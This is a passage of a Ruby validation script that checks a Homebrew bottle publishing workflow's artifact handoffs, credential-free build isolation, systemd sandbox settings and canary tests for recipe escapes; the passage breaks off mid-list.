    "Download exact prior-run OCI child" => [
      "oci_child",
      "${{ runner.temp }}/homebrew-oci-child",
    ],
    "Download exact prior-run upload receipt" => [
      "upload_receipt",
      "${{ runner.temp }}/homebrew-upload-receipt",
    ],
    "Download exact prior-run public index evidence" => [
      "index_publication",
      "${{ runner.temp }}/homebrew-index-publication",
    ],
  }.each do |name, (key, path)|
    step = named_step(stage_steps, name)
    check(step["uses"] == DOWNLOAD_ACTION && step["with"] == {
            "artifact-ids" =>
              "${{ fromJson(needs.plan.outputs.revalidation-source)." \
              "artifacts.#{key}.id }}",
            "path" => path,
            "github-token" => "${{ github.token }}",
            "repository" => "${{ inputs.tap-repository }}",
            "run-id" =>
              "${{ fromJson(needs.plan.outputs.revalidation-source).run_id }}",
            "merge-multiple" => true,
          }, "publisher #{name.inspect} contract changed")
  end
  stage_bind = named_step(
    stage_steps, "Bind imported payloads to the reviewed partial publication"
  )
  check(stage_bind.keys.sort == %w[env name run shell] &&
        stage_bind["shell"] == "bash" && stage_bind["env"] == {
          "ARCH" => "${{ matrix.arch }}",
          "FORMULA" => "${{ matrix.formula }}",
          "REVALIDATION_SOURCE" =>
            "${{ needs.plan.outputs.revalidation-source }}",
        }, "publisher cross-run payload binding environment changed")
  [
    'find -H "$root" -mindepth 1 ! -type f ! -type d',
    "prior-run artifact directory topology is not exact",
    "prior-run artifact topology differs from its strict handoff",
    'actual_sha256="$(sha256sum "$bottle"',
    '.child_manifest_digest',
    '.top_index_digest',
    '.producer_kandelo_commit',
    '.producer_tap_commit',
    "prior-run OCI blob differs from its content digest",
    "prior-run handoffs differ from the reviewed public graph",
  ].each do |fragment|
    check(stage_bind.fetch("run").include?(fragment),
          "publisher cross-run payload binding lacks #{fragment}")
  end
  {
    "Stage strict bottle build handoff for ordinary verification" => {
      "name" => build_handoff_name,
      "path" => "${{ runner.temp }}/homebrew-build-handoff",
      "compression-level" => 0,
      "if-no-files-found" => "error", "retention-days" => 2,
    },
    "Stage deterministic Homebrew OCI child for ordinary verification" => {
      "name" => child_layout_name,
      "path" => "${{ runner.temp }}/homebrew-oci-child",
      "compression-level" => 0,
      "if-no-files-found" => "error", "retention-days" => 2,
    },
    "Stage strict upload receipt for ordinary verification" => {
      "name" => upload_receipt_name,
      "path" => "${{ runner.temp }}/homebrew-upload-receipt/receipt.json",
      "if-no-files-found" => "error", "retention-days" => 2,
    },
    "Stage public Homebrew version-index evidence for ordinary verification" => {
      "name" => index_publication_name,
      "path" => "${{ runner.temp }}/homebrew-index-publication/layout-receipt.json\n" \
                "${{ runner.temp }}/homebrew-index-publication/transport-receipt.json\n",
      "compression-level" => 0,
      "if-no-files-found" => "error", "retention-days" => 2,
    },
  }.each do |name, with|
    step = named_step(stage_steps, name)
    check(step.keys.sort == %w[name uses with] &&
          step["uses"] == UPLOAD_ACTION && step["with"] == with,
          "publisher #{name.inspect} contract changed")
  end
  check(stage_steps.none? { |step| step["uses"] == CHECKOUT_ACTION } &&
        !stage_steps.filter_map { |step| step["run"] }.join("\n").match?(
          /\b(?:brew|oras|docker|podman|homebrew-ghcr-upload)\b/i
        ),
        "publisher cross-run staging executes source or registry tooling")
  publish_handoff_upload = named_step(verify_steps, "Upload validated publication handoff")
  check(publish_handoff_upload["uses"] == UPLOAD_ACTION && publish_handoff_upload["with"] == {
    "name" => publish_handoff_name,
    "path" => "${{ runner.temp }}/homebrew-publish-handoff",
    "compression-level" => 0,
    "if-no-files-found" => "error", "retention-days" => 2,
  }, "publisher publication handoff artifact contract changed")
  publish_handoff_download = named_step(
    finalize_steps, "Download the complete validated publication handoff set"
  )
  check(publish_handoff_download["uses"] == DOWNLOAD_ACTION &&
        publish_handoff_download["id"] == "publish-handoffs" &&
        publish_handoff_download["continue-on-error"] == true &&
        publish_handoff_download["with"] == {
          "pattern" => "homebrew-publish-handoff-*-attempt-${{ github.run_attempt }}",
          "path" => "${{ runner.temp }}/homebrew-publish-handoffs",
          "merge-multiple" => false,
        }, "publisher publication handoff download contract changed")
  vfs_handoff_upload = named_step(
    verify_steps, "Upload exact browser-proven VFS release handoff"
  )
  vfs_handoff_condition = "${{ !inputs.dry-run && inputs.require-vfs-acceptance && " \
                          "matrix.arch == 'wasm32' && matrix.formula == " \
                          "needs.plan.outputs.vfs-acceptance-formula }}"
  check(vfs_handoff_upload["uses"] == UPLOAD_ACTION &&
        vfs_handoff_upload["if"] == vfs_handoff_condition &&
        vfs_handoff_upload["with"] == {
          "name" => vfs_release_handoff_name,
          "path" => "${{ runner.temp }}/homebrew-vfs-release-handoff",
          "compression-level" => 0,
          "if-no-files-found" => "error", "retention-days" => 2,
        }, "publisher VFS release handoff artifact contract changed")
  vfs_handoff_download = named_step(
    vfs_release_steps, "Download exact browser-proven VFS release handoff"
  )
  check(vfs_handoff_download["uses"] == DOWNLOAD_ACTION &&
        vfs_handoff_download["with"] == {
          "name" => "homebrew-vfs-release-handoff-" \
                    "${{ needs.plan.outputs.vfs-acceptance-formula }}-wasm32-attempt-" \
                    "${{ github.run_attempt }}",
          "path" => "${{ runner.temp }}/homebrew-vfs-release-handoff",
        }, "publisher VFS release handoff download contract changed")
  vfs_receipt_upload = named_step(vfs_release_steps, "Upload public VFS publication receipt")
  check(vfs_receipt_upload["uses"] == UPLOAD_ACTION && vfs_receipt_upload["with"] == {
    "name" => vfs_release_receipt_name,
    "path" => "${{ runner.temp }}/homebrew-vfs-release-receipt.json",
    "if-no-files-found" => "error", "retention-days" => 14,
  }, "publisher VFS release receipt artifact contract changed")

  build_formula_step = named_step(
    build_steps, "Build and test Homebrew bottle without publisher credentials"
  )
  build_run = build_formula_step.fetch("run")
  check(build_formula_step.fetch("env").fetch("WASM_POSIX_XTASK_BIN") ==
          "${{ steps.formula-runtime.outputs.xtask-bin }}",
        "publisher does not scope the prepared checker to Formula execution")
  check(
    build_formula_step.fetch("env").slice(
      "KANDELO_HOMEBREW_AUTHORITY_RUBY",
      "KANDELO_HOMEBREW_PACKAGE_GENERATION_KIND",
      "KANDELO_HOMEBREW_ROOTFS_PUBLICATION_SELECTION"
    ) == {
      "KANDELO_HOMEBREW_AUTHORITY_RUBY" =>
        "${{ steps.build-authority-tools.outputs.ruby }}",
      "KANDELO_HOMEBREW_PACKAGE_GENERATION_KIND" =>
        "${{ needs.plan.outputs.package-generation-kind }}",
      "KANDELO_HOMEBREW_ROOTFS_PUBLICATION_SELECTION" =>
        "${{ needs.plan.outputs.rootfs-publication-selection }}",
    },
    "publisher does not carry the planned rootfs Formula authority to execution"
  )
  xtask_environment_steps = build_steps.select do |step|
    step.fetch("env", {}).key?("WASM_POSIX_XTASK_BIN")
  end
  check(xtask_environment_steps == [build_formula_step],
        "publisher exposes the prepared checker outside Formula execution")
  verify_formula_step = named_step(
    verify_steps, "Force-pour and test the exact selected bottle without credentials"
  )
  check(verify_formula_step.fetch("env").fetch("WASM_POSIX_XTASK_BIN") ==
          "${{ steps.formula-verification-runtime.outputs.xtask-bin }}",
        "publisher does not scope the prepared checker to Formula verification")
  verify_xtask_environment_steps = verify_steps.select do |step|
    step.fetch("env", {}).key?("WASM_POSIX_XTASK_BIN")
  end
  check(verify_xtask_environment_steps == [verify_formula_step],
        "publisher exposes the prepared verifier checker outside Formula execution")
  all_xtask_environment_steps = jobs.values.flat_map do |job|
    job.fetch("steps", [])
  end.select do |step|
    step.fetch("env", {}).key?("WASM_POSIX_XTASK_BIN")
  end
  check(all_xtask_environment_steps == [build_formula_step, verify_formula_step],
        "publisher checker authority is not scoped to the two Formula execution steps")
  build_dev_shell_index = build_run.index("bash scripts/dev-shell.sh env")
  build_checker_forward_index = build_run.index(
    'WASM_POSIX_XTASK_BIN="$WASM_POSIX_XTASK_BIN"'
  )
  build_script_index = build_run.index(
    "bash scripts/homebrew-bottle-build.sh", build_checker_forward_index || 0
  )
  check(build_dev_shell_index && build_checker_forward_index && build_script_index &&
        build_dev_shell_index < build_checker_forward_index &&
        build_checker_forward_index < build_script_index,
        "publisher does not pass the scoped checker through the Formula build command")
  verify_run = verify_formula_step.fetch("run")
  verify_dev_shell_index = verify_run.index("bash scripts/dev-shell.sh env")
  verify_checker_forward_index = verify_run.index(
    'WASM_POSIX_XTASK_BIN="$WASM_POSIX_XTASK_BIN"'
  )
  verify_script_index = verify_run.index(
    "bash scripts/homebrew-verify-poured-bottle.sh",
    verify_checker_forward_index || 0
  )
  check(verify_dev_shell_index && verify_checker_forward_index && verify_script_index &&
        verify_dev_shell_index < verify_checker_forward_index &&
        verify_checker_forward_index < verify_script_index,
        "publisher does not pass the scoped checker through the Formula verifier command")
  check(build_run.include?("unprivileged bottle build received $secret_name") &&
        build_run.include?("scripts/homebrew-bottle-build.sh") &&
        build_run.include?('readlink -f "$HOMEBREW_BREW_FILE"') &&
        build_run.include?('"$HOMEBREW_BREW_FILE" --repository'),
        "publisher build phase no longer rejects credentials or uses the reviewed builder")
  [
    '[ "$KANDELO_HOMEBREW_PACKAGE_GENERATION_KIND" = "rootfs-wasm32" ]',
    'jq -ceS --arg formula "$KANDELO_HOMEBREW_FORMULA"',
    "bash scripts/homebrew-rootfs-publication-selection.sh",
    '--resolved-taps "$KANDELO_HOMEBREW_RESOLVED_TAPS_FILE"',
    '--ruby-bin "$KANDELO_HOMEBREW_AUTHORITY_RUBY"',
    '[ "$actual_authority" = "$expected_authority" ]',
    "rootfs Formula authority changed before bottle execution",
  ].each do |fragment|
    check(build_run.include?(fragment),
          "publisher execution-boundary Formula authority lacks #{fragment}")
  end
  [
    '/usr/bin/od -An -N32 -tx1 /dev/urandom', "/usr/bin/tr -d ' \\n'",
    '[[ "$workflow_command_token" =~ ^[0-9a-f]{64}$ ]]',
    "trap restore_workflow_commands_on_exit EXIT",
    "workflow_commands_stopped=1",
    "printf '::stop-commands::%s\\n' \"$workflow_command_token\"",
    "printf '::%s::\\n' \"$workflow_command_token\"",
    'status="$?"', 'exit "$status"', "resume_workflow_commands", "trap - EXIT",
  ].each do |fragment|
    check(build_run.include?(fragment), "publisher Formula output boundary lacks #{fragment}")
  end
  stop_commands_index = build_run.index("printf '::stop-commands::%s\\n'")
  authority_index = build_run.index(
    "bash scripts/homebrew-rootfs-publication-selection.sh"
  )
  builder_index = build_run.index("bash scripts/homebrew-bottle-build.sh")
  resume_commands_index = build_run.rindex("resume_workflow_commands")
  check(stop_commands_index && authority_index && builder_index &&
        resume_commands_index &&
        stop_commands_index < authority_index &&
        authority_index < builder_index &&
        builder_index < resume_commands_index,
        "publisher Formula output is not enclosed by the workflow-command boundary")
  check(!build_run.match?(/(?:export|readonly|declare\s+-x)\s+workflow_command_token/) &&
        !build_run.include?("GITHUB_ENV=$workflow_command_token") &&
        build_run.scan(/workflow_command_token/).length == 4,
        "publisher exports the workflow-command token to Formula execution")
  check(!values_for_key(workflow, "run").join("\n").include?("GITHUB_PATH"),
        "publisher exposes a writable Homebrew prefix through job PATH")
  identity_step = named_step(build_steps, "Create isolated Formula execution identity")
  check(identity_step.keys.sort == %w[id name run shell] &&
        identity_step["id"] == "formula-identity" && identity_step["shell"] == "bash",
        "publisher Formula execution identity mapping changed")
  identity_run = identity_step.fetch("run")
  [
    'build_user="kandelo-homebrew-build"',
    'sudo_bin="/usr/bin/sudo"',
    'systemd_run_bin="/usr/bin/systemd-run"',
    'systemctl_bin="/usr/bin/systemctl"',
    'getent_bin="/usr/bin/getent"',
    'findmnt_bin="/usr/bin/findmnt"',
    'pgrep_bin="/usr/bin/pgrep"',
    'pkill_bin="/usr/bin/pkill"',
    'useradd_bin="/usr/sbin/useradd"',
    'userdel_bin="/usr/sbin/userdel"',
    'sudo_mode="$(stat -c \'%a\' "$sudo_bin"',
    'stat -c \'%u\' "$sudo_bin"',
    '8#$sudo_mode & 0022',
    'pkill_target="$(readlink -f -- "$pkill_bin"',
    '"$sudo_bin" -n -- "$useradd_bin" --system --user-group --create-home',
    '"$sudo_bin" -n -- "$useradd_bin" --system --user-group --no-create-home',
    '"$sudo_bin" -n -- "$userdel_bin" -r "$build_user"',
    "could not roll back partial Homebrew identity creation",
    'shared_temp=""',
    "rollback_identity_setup() {",
    "trap rollback_identity_setup EXIT",
    '[[ "$shared_temp" == /tmp/kandelo-homebrew.?????? ]]',
    '"$sudo_bin" -n -- /usr/bin/rm -rf -- "$shared_temp"',
    "could not roll back partial Homebrew temporary root",
    "could not roll back partial Homebrew recipe identity",
    "could not roll back partial Homebrew build identity",
    '[ "$(id -u "$build_user")" != "$(id -u)" ]',
    '"$sudo_bin" -n -u "$build_user" -- "$sudo_bin" -n true',
    'shared_temp="$(mktemp -d /tmp/kandelo-homebrew.XXXXXX)"',
    '"$sudo_bin" chmod 1777 "$shared_temp"',
    'echo "KANDELO_HOMEBREW_BUILD_USER=$build_user"',
    'echo "KANDELO_HOMEBREW_SHARED_TEMP=$shared_temp"',
    'echo "KANDELO_HOMEBREW_SUDO_BIN=$sudo_bin"',
    'echo "KANDELO_HOMEBREW_SYSTEMD_RUN_BIN=$systemd_run_bin"',
    'echo "KANDELO_HOMEBREW_SYSTEMCTL_BIN=$systemctl_bin"',
    'echo "KANDELO_HOMEBREW_GETENT_BIN=$getent_bin"',
    'echo "KANDELO_HOMEBREW_PGREP_BIN=$pgrep_bin"',
    'echo "KANDELO_HOMEBREW_PKILL_BIN=$pkill_bin"',
    "--expand-environment=",
    'echo "HOMEBREW_CACHE=$shared_temp/cache"',
    'echo "HOMEBREW_TEMP=$shared_temp/tmp"',
    'echo "created=true" >> "$GITHUB_OUTPUT"',
    "trap - EXIT",
  ].each do |fragment|
    check(identity_run.include?(fragment),
          "publisher Formula execution identity lacks #{fragment}")
  end
  recipe_identity_create =
    '"$sudo_bin" -n -- "$useradd_bin" --system --user-group --no-create-home'
  formula_rollback_index = identity_run.index("trap rollback_identity_setup EXIT")
  formula_temp_index = identity_run.index(
    'shared_temp="$(mktemp -d /tmp/kandelo-homebrew.XXXXXX)"'
  )
  formula_env_index = identity_run.index('} >> "$GITHUB_ENV"')
  formula_created_index = identity_run.index(
    'echo "created=true" >> "$GITHUB_OUTPUT"'
  )
  formula_commit_index = identity_run.rindex("trap - EXIT")
  check(identity_run.index(recipe_identity_create) < formula_rollback_index &&
        formula_rollback_index < formula_temp_index &&
        formula_temp_index < formula_env_index &&
        formula_env_index < formula_created_index &&
        formula_created_index < formula_commit_index,
        "publisher commits Formula identity before its shared realm")
  check_native_api_freeze = lambda do |steps, name, roots_projection, stem,
                                      label|
    step = named_step(steps, name)
    check(step.keys.sort == %w[env name run shell] &&
          step["shell"] == "bash" &&
          step["env"] == {
            "ARCH" => "${{ matrix.arch }}",
            "FORMULA" => "${{ matrix.formula }}",
            "TAP_NAME_INPUT" => "${{ inputs.tap-name }}",
            "TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
          }, "#{label} signed native API freeze mapping changed")
    run = step.fetch("run")
    [
      "set -euo pipefail",
      "umask 077",
      'cd "$GITHUB_WORKSPACE/kandelo"',
      ". scripts/homebrew-tap-identity.sh",
      'homebrew_resolve_tap_name "$TAP_REPOSITORY" "$TAP_NAME_INPUT"',
      'stem="$KANDELO_HOMEBREW_SHARED_TEMP/' + stem + '-${FORMULA}-${ARCH}"',
      "bash scripts/dev-shell.sh env \\",
      'KANDELO_HOMEBREW_RESOLVED_TAPS_FILE="$KANDELO_HOMEBREW_RESOLVED_TAPS_FILE" \\',
      "bash -c '",
      "scripts/homebrew-formula-runtime-closure.rb",
      '"$1" "$2" "$3" --host-dependencies-json >"$4"',
      "kandelo-native-plan",
      "scripts/homebrew-validate-host-dependency-plan.sh",
      "jq -r '.#{roots_projection}[]' \"$plan\" >\"$roots\"",
      'KANDELO_HOMEBREW_SUDO_BIN="$KANDELO_HOMEBREW_SUDO_BIN"',
      "scripts/homebrew-native-api-preflight.sh prepare",
      '"$HOMEBREW_BREW_FILE" "$api_cache" "$state"',
      '"$PWD/homebrew/homebrew-native-compatibility-roots.json"',
      'tap_formula_host_dependencies "$roots"',
      "KANDELO_HOMEBREW_EARLY_HOST_PLAN=$plan",
      "KANDELO_HOMEBREW_EARLY_HOST_ROOTS=$roots",
      "KANDELO_HOMEBREW_NATIVE_API_CACHE=$api_cache",
      "KANDELO_HOMEBREW_NATIVE_API_STATE=$state",
      "KANDELO_HOMEBREW_NATIVE_API_SOURCE=$api_cache/api",
      'echo "KANDELO_HOMEBREW_NATIVE_API_SOURCE="',
    ].each do |fragment|
      check(run.include?(fragment), "#{label} signed native API freeze lacks #{fragment}")
    end
    check(!run.include?('--host-dependencies-json >"$plan"'),
          "#{label} captures dev-shell startup output in the native plan")
    step
  end
  build_native_api_step = check_native_api_freeze.call(
    build_steps, "Freeze signed native Homebrew API", "build_and_test",
    "homebrew-native-api", "publisher build"
  )
  dev_shell = File.read(File.join(REPO_ROOT, "scripts/dev-shell.sh"))
  check(%w[
    KANDELO_HOMEBREW_BUILD_USER KANDELO_HOMEBREW_SHARED_TEMP
    KANDELO_HOMEBREW_SUDO_BIN KANDELO_HOMEBREW_SYSTEMD_RUN_BIN
    KANDELO_HOMEBREW_SYSTEMCTL_BIN KANDELO_HOMEBREW_GETENT_BIN
    KANDELO_HOMEBREW_PGREP_BIN
    KANDELO_HOMEBREW_PKILL_BIN
  ].all? { |name| dev_shell.include?("--keep #{name}") },
        "dev shell drops the isolated Formula build identity")
  check(%w[
    KANDELO_HOMEBREW_BUILD_ROOT KANDELO_HOMEBREW_RUNTIME_EVIDENCE
    KANDELO_HOMEBREW_BROWSER_EVIDENCE
  ].all? { |name| dev_shell.include?("--keep #{name}") },
        "dev shell drops exact Homebrew runtime evidence inputs")
  check(!dev_shell.include?("--keep KANDELO_HOMEBREW_RECIPE_USER"),
        "dev shell globally preserves Formula recipe identity and invalidates package caches")
  recipe_user_forwarding =
    'KANDELO_HOMEBREW_RECIPE_USER="$KANDELO_HOMEBREW_RECIPE_USER" \\'
  check(values_for_key(workflow, "run").join("\n").scan(recipe_user_forwarding).length == 2,
        "publisher does not scope Formula recipe identity to build and verification")
  check(!dev_shell.include?("--keep KANDELO_HOMEBREW_RESOLVED_TAPS_FILE"),
        "dev shell globally preserves Homebrew resolved-tap state and invalidates package caches")
  resolved_taps_forwarding =
    'KANDELO_HOMEBREW_RESOLVED_TAPS_FILE="$KANDELO_HOMEBREW_RESOLVED_TAPS_FILE" \\'
  check(values_for_key(workflow, "run").join("\n").scan(resolved_taps_forwarding).length == 17,
        "publisher does not explicitly carry immutable resolved taps across every consuming dev-shell boundary")
  native_api_variables = %w[
    KANDELO_HOMEBREW_EARLY_HOST_PLAN
    KANDELO_HOMEBREW_EARLY_HOST_ROOTS
    KANDELO_HOMEBREW_NATIVE_API_CACHE
    KANDELO_HOMEBREW_NATIVE_API_STATE
    KANDELO_HOMEBREW_NATIVE_API_SOURCE
  ]
  check(native_api_variables.none? { |name| dev_shell.include?("--keep #{name}") },
        "dev shell globally preserves run-scoped native API state")
  all_workflow_runs = values_for_key(workflow, "run").join("\n")
  native_api_variables.each do |name|
    forwarding = "#{name}=\"$#{name}\" \\"
    check(all_workflow_runs.scan(forwarding).length == 2,
          "publisher does not scope #{name} to build and verification")
  end
  check(!dev_shell.include?("--keep KANDELO_HOMEBREW_TAP_NAME"),
        "dev shell globally preserves caller-selected Homebrew tap identity")
  flake = File.binread(File.join(REPO_ROOT, "flake.nix"))
  check(flake.scan("pkgs.gnutar".b).length == 1,
        "dev shell does not declare exactly one GNU tar publisher input")
  bottle_builder = File.read(File.join(REPO_ROOT, "scripts/homebrew-bottle-build.sh"))
  check(
    bottle_builder.scan("homebrew_local_tap_clone_url").length == 2 &&
      bottle_builder.include?(
        '"$BREW_BIN" tap "$TAP_NAME" "$PRIMARY_TAP_CLONE_URL"'
      ) &&
      bottle_builder.include?(
        '"$BREW_BIN" tap "$dependency_tap" ' \
        '"$dependency_tap_clone_url"'
      ) &&
      !bottle_builder.include?(
        '"$BREW_BIN" tap "$TAP_NAME" "$TAP_ROOT"'
      ) &&
      !bottle_builder.include?(
        '"$BREW_BIN" tap "$dependency_tap" "$dependency_root"'
      ),
    "publisher local tap clones can still share Git object inodes"
  )
  [
    "if jq -e '.schema == 3'",
    '"manifest_sha256", "pkg_version", "resources"',
    '.tap_recipe.pkg_version == $version',
    'bottle pkg_version differs from the sealed tap recipe attestation',
    '(.tap_recipe.resources | type == "array"',
    'keys == ["name", "source_sha256", "source_url"]',
    'length <= 32',
    "scripts/build-fork-instrument-tool.sh",
    "scripts/build-local-root-spill-tool.sh",
    "required closed-recipe platform tool is unavailable",
  ].each do |fragment|
    check(bottle_builder.include?(fragment),
          "closed tap recipe platform-tool staging lacks #{fragment}")
  end
  recipe_runner = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-tap-recipe-runner.py")
  )
  [
    "--stage-recipe",
    "--stage-native-closure",
    "--stage-formula-test-runtime",
    "--audit-native-links",
    "selected-recipe",
    "tap recipe manifest differs from the publisher attestation",
    "dir_fd=",
    "os.O_NOFOLLOW",
    "os.O_NONBLOCK",
    "host_tool_projection(config)",
    "validate_requested_resources(request, config, build_root)",
    'build_root / "kandelo-package-resources"',
    'Path("/kandelo/resources") / name',
    "Formula resource staging root has missing or extra resources",
    "Formula resource {name} left the reserved staging layout",
    "tap recipe dependency and resource paths collide",
    "Formula resource staging identity changed",
    "MAX_RESOURCE_ENTRIES = 65_536",
    "MAX_RESOURCE_FILE_BYTES = 268_435_456",
    "MAX_RESOURCE_BYTES = 1_073_741_824",
    "source directory changed while copied",
    "*resource_binds",
    "for root in nix_store_requisites(config)",
    '"--requisites"',
    "NIX_STORE_ROOT_RE",
    "host_projection_metadata(",
    "path={path} uid={metadata.st_uid} gid={metadata.st_gid}",
    "expected=absolute-root:root-{expected_name}-not-group/other-writable",
    "prepare_service_root(service_root, readonly_binds, readwrite_binds)",
    "add_runner_owned_platform_environment(",
    '"WASM_POSIX_DEP_PKG_VERSION"',
    '"WASM_POSIX_DEP_PKG_VERSION": config["pkg_version"]',
    "valid_homebrew_pkg_version(",
    "config pkg_version differs from its base version",
    'SDK_CONFIG_SITE_ENV_KEY = "WASM_POSIX_SDK_CONFIG_SITE"',
    'SDK_CONFIG_SITE_RELATIVE = Path("sdk/config.site")',
    "projected SDK config site is not one sealed mode-0444 file",
    "recipe environment tried to override the SDK config-site input",
    '".." in PurePosixPath(rendered).parts',
    "safe_systemd_path_text(",
    "safe_tree_text(",
    "RootDirectory={service_root}",
    "MountAPIVFS=yes",
    "ProtectHome=tmpfs",
    "RestrictAddressFamilies=AF_UNIX",
    "SupplementaryGroups=",
    "tap recipe exceeded its diagnostic output limit",
    "MAX_RECIPE_FAILURE_DIAGNOSTIC_BYTES = 65_536",
    "max_tail_bytes=MAX_RECIPE_FAILURE_DIAGNOSTIC_BYTES",
    "systemd-run --pipe makes this exact credential-free recipe",
    "sanitize_recipe_diagnostic(diagnostic_tail)",
    "BoundedCommandError(",
    "recipe_execution_error_from_command(error)",
    "RecipeExecutionError(",
    "runner_error_reply(error)",
    "accept_runner_reply(reply)",
    "teardown_recipe_unit(unit, config)",
    "symlink_projections=projected_dependencies",
    "native closure manifest appeared before native Homebrew was sealed",
    "authenticated_native_closure(",
    "native Cellar differs from its authenticated sealed closure",
    "native Cellar omits declared direct tools",
    "native_prefix_runtime_roots(",
    "authenticate_native_runtime_root(",
    "dependency_projection_map(",
    "projected_symlink_resolution(",
    "audit_projected_tree_symlinks(",
    "native prefix runtime differs from its authenticated closure",
    "native_closure_path_roots(",
    "closed_recipe_path(",
    "native_execution_roots(",
    "requested_native_proxy_roots(",
    "dependency_keg_binds(",
    "recipe output file has unsafe links, mode, or size",
    "FORMULA_TEST_RUNTIME_DIRECTORIES = (",
    "FORMULA_TEST_RUNTIME_EMPTY_DIRECTORIES = (",
    "FORMULA_TEST_RUNTIME_NODE_MODULE_ROOTS = (",
    'Path("apps/browser-demos")',
    '"playwright"',
    '"vite"',
    'FORMULA_TEST_RUNTIME_VITE_CLI = Path("node_modules/vite/bin/vite.js")',
    'FORMULA_TEST_RUNTIME_VITE_BIN = Path("node_modules/.bin/vite")',
    'FORMULA_TEST_RUNTIME_VITE_BIN_TARGET = "../vite/bin/vite.js"',
    "expected_target=FORMULA_TEST_RUNTIME_VITE_BIN_TARGET",
    "Formula test empty compatibility directory is occupied",
    "formula_test_node_module_projection(",
    "Formula test npm closure changed during staging",
    "FORMULA_TEST_RUNTIME_PROGRAM_INDEX_DESTINATION = Path(",
    '"host/wasm/program-packages.json"',
    "Formula test selected program-package projection",
    "validate_tree_regular_links_closed(",
    "regular-file hard links escape the selected closure",
    "Formula test runtime input changed during staging",
    "Formula test runtime source root changed during staging",
    "Formula test runtime differs from its selected source closure",
  ].each do |fragment|
    check(recipe_runner.include?(fragment),
          "tap recipe runner lacks closed-boundary contract #{fragment}")
  end
  check(!recipe_runner.include?("/usr/bin/journalctl") &&
        !recipe_runner.include?("report_recipe_unit_failure"),
        "tap recipe failure diagnostics query a manager journal outside the exact recipe pipe")
  check(!recipe_runner.include?("PrivateTmp=yes"),
        "tap recipe runner masks publisher bind targets with PrivateTmp")
  check(!recipe_runner.include?("TemporaryFileSystem=/etc"),
        "tap recipe runner hides its sealed /etc bind destinations")
  check(!recipe_runner.include?("BindReadOnlyPaths=/:"),
        "tap recipe runner exposes the host root inside its service root")
  check(!recipe_runner.include?('label="Nix runtime store"'),
        "tap recipe runner exposes the whole Nix store instead of exact closures")
  launcher_test = File.read(
    File.join(REPO_ROOT, "scripts/test-homebrew-patched-launcher.sh")
  )
  check(
    launcher_test.include?(
      'python3 "$REPO_ROOT/scripts/test-homebrew-tap-recipe-runner.py"'
    ),
    "publisher validation does not run the focused recipe-runner contract tests"
  )
  [
    "KANDELO_RUN_SYSTEMD_RECIPE_ROOT_TEST=1",
    "LiveSystemdServiceRootTests",
  ].each do |fragment|
    check(launcher_test.include?(fragment),
          "Linux publisher validation does not execute #{fragment}")
  end
  [
    "tap recipe can read an unrelated host file",
    "tap recipe escaped its root through host procfs",
    "/run/systemd/private",
    "tap recipe started a host transient service",
    "tap recipe changed a projected Formula resource",
    "WASM_POSIX_DEP_RESOURCE_FIXTURE_DATA_DIR",
    '"fixture-data": $resource_root',
    "tap recipe canary did not return its declared output",
    "recipe supervisor did not reserve an absent native closure handoff",
    "native sealing did not publish its complete root-owned closure",
    "isolated native Formula proxy exposed a transitive-only keg",
  ].each do |fragment|
    check(launcher_test.include?(fragment),
          "publisher validation lacks malicious recipe canary #{fragment}")
  end
  [
    'ISOLATION_RECIPE_USER="kandelo-homebrew-recipe"',
    "--no-create-home",
    'export KANDELO_HOMEBREW_RECIPE_USER="$ISOLATION_RECIPE_USER"',
    'HOMEBREW_KANDELO_NODE="$(command -v node)"',
    "platform projection left an unsealed ancestor",
    "platform projection verification accepted a hard-linked file",
    "populated sealed-output root lost its portable directory seal",
  ].each do |fragment|
    check(launcher_test.include?(fragment),
          "live recipe canary fixture lacks #{fragment}")
  end
  host_dependency_validator = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-validate-host-dependency-plan.sh")
  )
  [
    'keys == ["build", "build_and_test", "formula", "full_name", "native_requirements", "runtime_and_test", "schema", "tap", "target_taps"]',
    '.schema == 4',
    '(.build | type == "array" and length <= 128)',
    '(.build_and_test | type == "array" and length <= 128)',
    '(.runtime_and_test | type == "array" and length <= 128)',
    'keys == ["class", "formula", "sentinel", "tags"]',
    '--slurpfile resolved "$RESOLVED_TAPS"',
    'map({tap_name, tap_repository, tap_commit}) | sort_by(.tap_name)',
    '(.native_requirements == (.native_requirements | sort_by(.class)))',
    '((.native_requirements | map(.class)) == (.native_requirements | map(.class) | unique))',
    '(.tags == ["build"] or .tags == ["build", "test"])',
    '($plan.build | index($native.formula) != null)',
    '($plan.runtime_and_test | index($native.formula) == null)',
  ].each do |fragment|
    check(host_dependency_validator.include?(fragment),
          "host dependency plan validator lacks #{fragment}")
  end
  formula_support_inputs = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-formula-support-inputs.sh")
  )
  [
    "homebrew_prune_formula_support_tests_from_tapped_clone()",
    'test_relative="Kandelo/formula_support/test"',
    'test_root="$tapped_root/$test_relative"',
    'git -C "$tapped_root" ls-tree HEAD -- "$test_relative"',
    'git -C "$tapped_root" ls-tree -r HEAD -- "$test_relative"',
    'awk \'$1 != "100644" && $1 != "100755" { print; exit }\'',
    'find "$test_root" -mindepth 1',
    'rm -rf -- "$test_root"',
  ].each do |fragment|
    check(formula_support_inputs.include?(fragment),
          "Formula support execution-input boundary lacks #{fragment}")
  end
  check(!formula_support_inputs.include?('Kandelo/formula_support/*') &&
        !formula_support_inputs.include?('Kandelo/formula_support/**') &&
        formula_support_inputs.scan('rm -rf -- "$test_root"').length == 1,
        "Formula support execution-input boundary prunes more than the reserved test tree")
  formula_closure = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-formula-runtime-closure.rb")
  )
  [
    'context_repository == repository_for_tap.call(context_name)',
    'dependency Formula uses an undeclared tap',
    'host dependency plan requires an immutable resolved tap map',
    '"tap_name" => context.fetch("tap_name")',
    '"tap_repository" => context.fetch("tap_repository")',
    '"tap_commit" => commit',
    '"target_taps" => immutable_target_taps',
    'FORMULA_SUPPORT_API_VERSION = 1',
    'MAX_TIER2_CONTROL_BYTES = 65_536',
    'MAX_SUPPORT_RUNTIME_FILES = 128',
    'canonical_guard_lines = [',
    'guarded_definition[1].is_a?(Array) && guarded_definition[1].length == 1',
    'support_runtime_sha256_by_tap',
    'JSON.generate(support_runtime_files)',
    'support_copies.values.uniq.length > 1',
    'Kandelo Formula support API or runtime-tree bytes differ across the immutable tap closure',
    'KANDELO_NATIVE_FORMULA',
    'KANDELO_NATIVE_SENTINEL',
